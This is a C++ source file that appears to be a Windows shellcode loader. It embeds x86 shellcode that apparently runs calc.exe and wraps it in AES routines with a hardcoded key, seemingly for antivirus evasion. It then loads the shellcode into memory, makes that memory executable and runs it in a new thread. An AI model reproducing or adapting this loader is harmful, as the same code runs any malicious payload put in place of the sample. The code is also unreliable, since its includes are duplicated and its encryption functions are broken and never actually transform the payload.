#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <iostream>
#include<wincrypt.h>

#define AES256_KEY_SIZE     32 // 256 bits
#define AES_BLOCK_SIZE      16 // 128 bits
#define IV_SIZE             AES_BLOCK_SIZE

unsigned char IV[] = { 0x12, 0x34, 0x56, 0x78, 0x90, 0x12, 0x34, 0x56, 0x12, 0x34, 0x56, 0x78, 0x90, 0x12, 0x34, 0x56 };
unsigned char KEY[] = { 0x12, 0x34, 0x56, 0x78, 0x90, 0x12, 0x34, 0x56, 0x12, 0x34, 0x56, 0x78, 0x90, 0x12, 0x34, 0x56, 0x12, 0x34, 0x56, 0x78, 0x90, 0x12, 0x34, 0x56, 0x12, 0x34, 0x56, 0x78, 0x90, 0x12, 0x34, 0x56 };
#include <windows.h>
#include <wincrypt.h>

#define AES256_KEY_SIZE 32 // 256 bits
#define AES_BLOCK_SIZE 16 // 128 bits

// Define your IV and key here as byte arrays

void EncryptAES256(unsigned char *plainData, DWORD dataSize, unsigned char *key, unsigned char *iv) {
    HCRYPTPROV hCryptProv = 0;
    HCRYPTKEY hKey = 0;

    if (!CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        // Handle error
        return;
    }

    if (!CryptImportKey(hCryptProv, key, AES256_KEY_SIZE, 0, 0, &hKey)) {
        CryptReleaseContext(hCryptProv, 0);
        // Handle error
        return;
    }

    if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) {
        CryptDestroyKey(hKey);
        CryptReleaseContext(hCryptProv, 0);
        // Handle error
        return;
    }

    // Allocate memory for the encrypted data
    DWORD encryptedSize = dataSize;
    unsigned char *encryptedData = (unsigned char *)malloc(encryptedSize);

    if (!CryptEncrypt(hKey, NULL, TRUE, 0, encryptedData, &encryptedSize, dataSize)) {
        free(encryptedData);
        CryptDestroyKey(hKey);
        CryptReleaseContext(hCryptProv, 0);
        // Handle error
        return;
    }

    // Now, 'encryptedData' contains the encrypted data

    // Cleanup
    free(encryptedData);
    CryptDestroyKey(hKey);
    CryptReleaseContext(hCryptProv, 0);
}


void DecryptAES256(unsigned char *encryptedData, DWORD dataSize, unsigned char *key, unsigned char *iv) {
    HCRYPTPROV hCryptProv = 0;
    HCRYPTKEY hKey = 0;

    if (!CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        // Handle error
        return;
    }

    if (!CryptImportKey(hCryptProv, key, AES256_KEY_SIZE, 0, 0, &hKey)) {
        CryptReleaseContext(hCryptProv, 0);
        // Handle error
        return;
    }

    if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) {
        CryptDestroyKey(hKey);
        CryptReleaseContext(hCryptProv, 0);
        // Handle error
        return;
    }

    if (!CryptDecrypt(hKey, 0, TRUE, 0, encryptedData, &dataSize)) {
        CryptDestroyKey(hKey);
        CryptReleaseContext(hCryptProv, 0);
        // Handle error
        return;
    }

    CryptDestroyKey(hKey);
    CryptReleaseContext(hCryptProv, 0);
}
// main code
int main(VOID){

// shellcode payload
unsigned char shellcode_payload[] = {
	0xFC, 0xE8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xE5, 0x31, 0xC0, 0x64,
	0x8B, 0x50, 0x30, 0x8B, 0x52, 0x0C, 0x8B, 0x52, 0x14, 0x8B, 0x72, 0x28,
	0x0F, 0xB7, 0x4A, 0x26, 0x31, 0xFF, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C,
	0x20, 0xC1, 0xCF, 0x0D, 0x01, 0xC7, 0xE2, 0xF2, 0x52, 0x57, 0x8B, 0x52,
	0x10, 0x8B, 0x4A, 0x3C, 0x8B, 0x4C, 0x11, 0x78, 0xE3, 0x48, 0x01, 0xD1,
	0x51, 0x8B, 0x59, 0x20, 0x01, 0xD3, 0x8B, 0x49, 0x18, 0xE3, 0x3A, 0x49,
	0x8B, 0x34, 0x8B, 0x01, 0xD6, 0x31, 0xFF, 0xAC, 0xC1, 0xCF, 0x0D, 0x01,
	0xC7, 0x38, 0xE0, 0x75, 0xF6, 0x03, 0x7D, 0xF8, 0x3B, 0x7D, 0x24, 0x75,
	0xE4, 0x58, 0x8B, 0x58, 0x24, 0x01, 0xD3, 0x66, 0x8B, 0x0C, 0x4B, 0x8B,
	0x58, 0x1C, 0x01, 0xD3, 0x8B, 0x04, 0x8B, 0x01, 0xD0, 0x89, 0x44, 0x24,
	0x24, 0x5B, 0x5B, 0x61, 0x59, 0x5A, 0x51, 0xFF, 0xE0, 0x5F, 0x5F, 0x5A,
	0x8B, 0x12, 0xEB, 0x8D, 0x5D, 0x6A, 0x01, 0x8D, 0x85, 0xB2, 0x00, 0x00,
	0x00, 0x50, 0x68, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xE0, 0x1D,
	0x2A, 0x0A, 0x68, 0xA6, 0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x3C, 0x06, 0x7C,
	0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A,
	0x00, 0x53, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65,
	0x00};

// shellcode length
unsigned int shellcode_length=sizeof(shellcode_payload);
   

    EncryptAES256(shellcode_payload,shellcode_length , KEY, IV);

 DecryptAES256(shellcode_payload, shellcode_length, KEY, IV);

// allocate the memory
LPVOID memory_address=VirtualAlloc(
    NULL,
    shellcode_length,
    MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE
);



// load the shellcode in the memory

RtlMoveMemory(
    memory_address,shellcode_payload,shellcode_length
);

// make shellcode executable
DWORD old_protection=0;
BOOL returned_vp= VirtualProtect(
    memory_address,
    shellcode_length,
    PAGE_EXECUTE_READ,
    & old_protection
);

// execute thread
if(returned_vp!= NULL){
    HANDLE thread_handle= CreateThread(
        NULL,
        NULL,
        (LPTHREAD_START_ROUTINE) memory_address,
        NULL,NULL,NULL
    );

    // wait for thread to complete
    WaitForSingleObject(
        thread_handle,
        INFINITE
    );
}
}